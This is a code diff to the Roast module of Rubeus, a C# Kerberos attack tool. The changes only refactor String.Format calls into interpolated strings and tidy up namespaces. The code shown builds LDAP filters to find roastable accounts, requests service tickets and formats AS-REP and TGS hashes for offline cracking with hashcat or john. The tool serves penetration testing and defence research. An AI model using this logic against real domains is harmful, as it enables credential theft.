@@ -4,8 +4,6 @@ using System.IO;
 using ConsoleTables;
 using System.Text.RegularExpressions;
 using System.Security.Principal;
-using System.DirectoryServices;
-using System.DirectoryServices.AccountManagement;
 using System.Collections.Generic;
 using Rubeus.lib.Interop;
 
@@ -49,11 +47,11 @@ namespace Rubeus
                 }
                 else
                 {
-                    userSearchFilter = String.Format("(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName={0}))", userName);
+                    userSearchFilter = $"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName={userName}))";
                 }
                 if (!String.IsNullOrEmpty(ldapFilter))
                 {
-                    userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
+                    userSearchFilter = $"(&{userSearchFilter}({ldapFilter}))";
                 }
                 
                 if (String.IsNullOrEmpty(domain))
@@ -126,11 +124,11 @@ namespace Rubeus
                 string hashString = "";
                 if (format == "john")
                 {
-                    hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
+                    hashString = $"$krb5asrep${userName}@{domain}:{repHash}";
                 }
                 else if (format == "hashcat")
                 {
-                    hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
+                    hashString = $"$krb5asrep$23${userName}@{domain}:{repHash}";
                 }
                 else
                 {
@@ -155,7 +153,7 @@ namespace Rubeus
                     Console.WriteLine("[*] AS-REP hash:\r\n");
 
                     // display the base64 of a hash, columns of 80 chararacters
-                    if (Rubeus.Program.wrapTickets)
+                    if (Program.wrapTickets)
                     {
                         foreach (string line in Helpers.Split(hashString, 80))
                         {
@@ -315,7 +313,7 @@ namespace Rubeus
                         }
                         
                         // request a service tickt for LDAP on the target DC
-                        kirbiBytes = Ask.TGS(tgtUserName, ticketDomain, ticket, clientKey, etype, string.Format("ldap/{0}", dc), etype, null, false, dc, false, enterprise, false);
+                        kirbiBytes = Ask.TGS(tgtUserName, ticketDomain, ticket, clientKey, etype, $"ldap/{dc}", etype, null, false, dc, false, enterprise, false);
                     }
                     // otherwise inject the TGT to perform the domain searcher
                     else
@@ -336,14 +334,14 @@ namespace Rubeus
                         string userPart = "";
                         foreach (string user in userName.Split(','))
                         {
-                            userPart += String.Format("(samAccountName={0})", user);
+                            userPart += $"(samAccountName={user})";
                         }
-                        userFilter = String.Format("(&(|{0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))", userPart);
+                        userFilter = $"(&(|{userPart})(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";
                     }
                     else
                     {
                         // searching for a specified user, ensuring it's not a disabled account
-                        userFilter = String.Format("(samAccountName={0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2))", userName);
+                        userFilter = $"(samAccountName={userName})(!(UserAccountControl:1.2.840.113556.1.4.803:=2))";
                     }
                 }
                 else
@@ -395,7 +393,7 @@ namespace Rubeus
                         DateTime timeFromConverted = DateTime.ParseExact(pwdSetAfter, "MM-dd-yyyy", null);
                         DateTime timeUntilConverted = DateTime.ParseExact(pwdSetBefore, "MM-dd-yyyy", null);
                         string timePeriod = "(pwdlastset>=" + timeFromConverted.ToFileTime() + ")(pwdlastset<=" + timeUntilConverted.ToFileTime() + ")";
-                        userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1}{2})", userFilter, encFilter, timePeriod);
+                        userSearchFilter = $"(&(samAccountType=805306368)(servicePrincipalName=*){userFilter}{encFilter}{timePeriod})";
                     }
                     catch
                     {
@@ -405,12 +403,12 @@ namespace Rubeus
                 }
                 else
                 {
-                    userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);
+                    userSearchFilter = $"(&(samAccountType=805306368)(servicePrincipalName=*){userFilter}{encFilter})";
                 }
 
                 if (!String.IsNullOrEmpty(ldapFilter))
                 {
-                    userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
+                    userSearchFilter = $"(&{userSearchFilter}({ldapFilter}))";
                 }
 
                 List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, dc, domain, userSearchFilter, ldaps);
@@ -495,7 +493,7 @@ namespace Rubeus
 
                             if ((!String.IsNullOrEmpty(domain)) && (TGT == null))
                             {
-                                servicePrincipalName = String.Format("{0}@{1}", servicePrincipalName, domain);
+                                servicePrincipalName = $"{servicePrincipalName}@{domain}";
                             }
                             if (TGT != null)
                             {
@@ -519,7 +517,7 @@ namespace Rubeus
                                 if (!result && autoenterprise)
                                 {
                                     Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
-                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
+                                    servicePrincipalName = $"{samAccountName}@{domain}";
                                     GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, etype);
                                     Helpers.RandomDelayWithJitter(delay, jitter);
                                 }
@@ -532,7 +530,7 @@ namespace Rubeus
                                 if (!result && autoenterprise)
                                 {
                                     Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
-                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
+                                    servicePrincipalName = $"{samAccountName}@{domain}";
                                     GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
                                     Helpers.RandomDelayWithJitter(delay, jitter);
                                 }
@@ -647,12 +645,12 @@ namespace Rubeus
                                             //Ensure checksum is extracted from the end for aes keys
                                             int checksumStart = cipherText.Length - 24;
                                             //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.
-                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
+                                            hash = $"$krb5tgs${encType}${userName}${domain}$*{spn}*${cipherText.Substring(checksumStart)}${cipherText.Substring(0, checksumStart)}";
                                         }
                                         //if encType==23
                                         else
                                         {
-                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
+                                            hash = $"$krb5tgs${encType}$*{userName}${domain}${spn}*${cipherText.Substring(0, 32)}${cipherText.Substring(32)}";
                                         }
 
                                         if (!String.IsNullOrEmpty(outFile))
@@ -674,7 +672,7 @@ namespace Rubeus
                                         }
                                         else
                                         {
-                                            if (Rubeus.Program.wrapTickets)
+                                            if (Program.wrapTickets)
                                             {
                                                 bool header = false;
                                                 foreach (string line in Helpers.Split(hash, 80))
@@ -767,12 +765,12 @@ namespace Rubeus
             {
                 int checksumStart = cipherText.Length - 24;
                 //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.            
-                hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
+                hash = $"$krb5tgs${encType}${kerberoastUser}${kerberoastDomain}$*{sname}*${cipherText.Substring(checksumStart)}${cipherText.Substring(0, checksumStart)}";
             }
             //if encType==23
             else
             {
-                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
+                hash = $"$krb5tgs${encType}$*{kerberoastUser}${kerberoastDomain}${sname}*${cipherText.Substring(0, 32)}${cipherText.Substring(32)}";
             }
 
             if (!String.IsNullOrEmpty(outFile))
@@ -795,7 +793,7 @@ namespace Rubeus
             else
             {
                 bool header = false;
-                if (Rubeus.Program.wrapTickets)
+                if (Program.wrapTickets)
                 {
                     foreach (string line in Helpers.Split(hash, 80))
                     {
